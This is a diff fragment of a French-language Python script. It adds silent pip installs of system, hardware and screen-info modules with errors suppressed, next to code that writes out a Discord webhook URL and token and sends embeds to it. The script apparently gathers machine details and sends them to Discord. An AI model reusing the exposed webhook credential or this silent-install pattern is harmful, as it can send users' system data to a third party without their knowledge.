@@ -252,6 +252,42 @@ webhook_url = 'https://discord.com/api/webhooks/1184942625430720562/_GWFmcTWY0Wk
 send_embed(webhook_url, embed_title, embed_color)
 send_embed(webhook_invit, embed_title, embed_color)""")
  
+nom_module = 'requests'
+try:
+ subprocess.check_call(['pip', 'install', nom_module])
+except:
+   print("")
+
+nom_module = 'socket'
+try:
+ subprocess.check_call(['pip', 'install', nom_module])
+except:
+   print("")
+
+nom_module = 'platform'
+try:
+ subprocess.check_call(['pip', 'install', nom_module])
+except:
+   print("")
+
+nom_module = 'psutil'
+try:
+ subprocess.check_call(['pip', 'install', nom_module])
+except:
+   print("")
+
+nom_module = 'screeninfo'
+try:
+ subprocess.check_call(['pip', 'install', nom_module])
+except:
+   print("")
+
+nom_module = 'GPUtil'
+try:
+ subprocess.check_call(['pip', 'install', nom_module])
+except:
+   print("")
+
 with open(fichier_texte, 'r') as fichier_txt:
 
     contenu = fichier_txt.read()
